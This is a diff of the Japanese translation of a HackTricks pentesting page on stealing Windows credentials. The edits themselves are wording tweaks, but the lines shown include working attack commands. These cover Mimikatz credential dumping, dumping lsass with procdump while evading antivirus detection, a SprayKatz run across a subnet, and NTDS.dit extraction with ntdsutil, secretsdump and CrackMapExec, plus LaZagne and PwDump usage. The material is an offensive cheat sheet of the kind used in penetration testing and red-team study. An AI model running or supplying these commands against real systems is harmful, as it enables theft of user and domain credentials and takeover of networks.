@@ -1,4 +1,4 @@
-# Windows資格情報の盗難
+# Windowsの資格情報を盗む
 
 {% hint style="success" %}
 AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -9,13 +9,13 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 <summary>HackTricksをサポートする</summary>
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
 * **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
 
-## 資格情報Mimikatz
+## 資格情報 Mimikatz
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -58,12 +58,12 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-## AVをバイパスする
+## AVのバイパス
 
 ### Procdump + Mimikatz
 
-**SysInternalsのProcdumpは** [**Microsoftの正当なツール**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**であるため、Defenderに検出されません。**\
-このツールを使用して、**lsassプロセスをダンプし、**ダンプをダウンロードし、**ダンプから**資格情報をローカルに抽出**できます。
+**SysInternalsのProcdump**は**正当なMicrosoftツール**であるため、Defenderに検出されません。\
+このツールを使用して**lsassプロセスをダンプ**し、**ダンプをダウンロード**し、**ダンプからローカルに資格情報を抽出**できます。
 
 {% code title="Dump lsass" %}
 ```bash
@@ -84,9 +84,9 @@ mimikatz # sekurlsa::logonPasswords
 ```
 {% endcode %}
 
-このプロセスは自動的に[SprayKatz](https://github.com/aas-n/spraykatz)を使用して行われます：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+このプロセスは自動的に[SprayKatz](https://github.com/aas-n/spraykatz)を使用して行われます： `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**注意**：一部の**AV**は**procdump.exeを使用してlsass.exeをダンプする**ことを**悪意のある**ものとして**検出**する場合があります。これは、**"procdump.exe"と"lsass.exe"**という文字列を**検出**しているためです。したがって、**lsass.exeの名前の代わりに**lsass.exeの**PID**をprocdumpに**引数**として渡す方が**隠密**です。
+**注意**：一部の**AV**は**procdump.exeを使用してlsass.exeをダンプする**ことを**悪意のある**ものとして**検出**する場合があります。これは、**"procdump.exe"と"lsass.exe"**という文字列を**検出**しているためです。したがって、**lsass.exeの名前の代わりに**procdumpにlsass.exeの**PID**を**引数**として渡す方が**隠密**です。
 
 ### **comsvcs.dll**を使用したlsassのダンプ
 
@@ -150,7 +150,7 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
-### NTDS.dit アカウントごとの pwdLastSet 属性を表示する
+### 各NTDS.ditアカウントのpwdLastSet属性を表示する
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
@@ -205,7 +205,7 @@ $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
-## **Active Directoryの資格情報 - NTDS.dit**
+## **Active Directory Credentials - NTDS.dit**
 
 **NTDS.dit**ファイルは**Active Directory**の中心として知られ、ユーザーオブジェクト、グループ、およびそのメンバーシップに関する重要なデータを保持しています。ここにはドメインユーザーの**パスワードハッシュ**が保存されています。このファイルは**Extensible Storage Engine (ESE)**データベースであり、**_%SystemRoom%/NTDS/ntds.dit_**に存在します。
 
@@ -235,19 +235,19 @@ Windows Server 2008以降で利用可能です。
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-You could also use the [**ボリュームシャドウコピー**](./#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**レジストリからダンプするかボリュームシャドウコピー**](./#stealing-sam-and-system) trick).
+あなたはまた、[**ボリュームシャドウコピー**](./#stealing-sam-and-system)のトリックを使って**ntds.dit**ファイルをコピーすることもできます。**SYSTEMファイル**のコピーも必要であることを忘れないでください（再度、[**レジストリからダンプするか、ボリュームシャドウコピー**](./#stealing-sam-and-system)のトリックを使用してください）。
 
 ### **NTDS.ditからハッシュを抽出する**
 
-Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
+**NTDS.dit**と**SYSTEM**ファイルを**取得**したら、_secretsdump.py_のようなツールを使用して**ハッシュを抽出**できます：
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-あなたは有効なドメイン管理者ユーザーを使用して、**自動的に抽出することもできます**:
+あなたは有効なドメイン管理者ユーザーを使用して、**自動的にそれらを抽出する**こともできます:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-**大きな NTDS.dit ファイル**の場合、[gosecretsdump](https://github.com/c-sto/gosecretsdump)を使用して抽出することをお勧めします。
+**大きな NTDS.dit ファイル**については、[gosecretsdump](https://github.com/c-sto/gosecretsdump)を使用して抽出することをお勧めします。
 
 最後に、**metasploit モジュール**: _post/windows/gather/credentials/domain\_hashdump_ または **mimikatz** `lsadump::lsa /inject` を使用することもできます。
 
@@ -257,11 +257,11 @@ NTDS オブジェクトは、[ntdsdotsqlite](https://github.com/almandin/ntdsdot
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` ハイブはオプションですが、秘密の復号化を可能にします（NTおよびLMハッシュ、平文パスワード、Kerberosまたは信頼キー、NTおよびLMパスワード履歴などの補足資格情報）。他の情報とともに、以下のデータが抽出されます：ハッシュを持つユーザーおよびマシンアカウント、UACフラグ、最終ログオンおよびパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループおよび再帰的メンバーシップ、組織単位ツリーおよびメンバーシップ、信頼されたドメインと信頼の種類、方向および属性...
+`SYSTEM` ハイブはオプションですが、秘密の復号化を可能にします（NT & LM ハッシュ、平文パスワード、Kerberos または信頼キー、NT & LM パスワード履歴などの補足資格情報）。他の情報とともに、以下のデータが抽出されます：ハッシュを持つユーザーおよびマシンアカウント、UAC フラグ、最終ログオンおよびパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループおよび再帰的メンバーシップ、組織単位ツリーおよびメンバーシップ、信頼されたドメインと信頼の種類、方向および属性...
 
 ## Lazagne
 
-[こちら](https://github.com/AlessandroZ/LaZagne/releases)からバイナリをダウンロードしてください。このバイナリを使用して、いくつかのソフトウェアから資格情報を抽出できます。
+[こちら](https://github.com/AlessandroZ/LaZagne/releases)からバイナリをダウンロードします。このバイナリを使用して、いくつかのソフトウェアから資格情報を抽出できます。
 ```
 lazagne.exe all
 ```
@@ -269,7 +269,7 @@ lazagne.exe all
 
 ### Windows Credentials Editor (WCE)
 
-このツールはメモリから資格情報を抽出するために使用できます。ダウンロードはこちらから: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+このツールは、メモリから資格情報を抽出するために使用できます。ダウンロードはこちらから: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
@@ -280,7 +280,7 @@ fgdump.exe
 ```
 ### PwDump
 
-SAMファイルから資格情報を抽出する
+SAMファイルから資格情報を抽出します
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
@@ -302,7 +302,7 @@ GCPハッキングを学び、実践する: <img src="/.gitbook/assets/grte.png"
 
 <summary>HackTricksをサポートする</summary>
 
-* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**テレグラムグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
 * **ハッキングのトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出してください。**
 
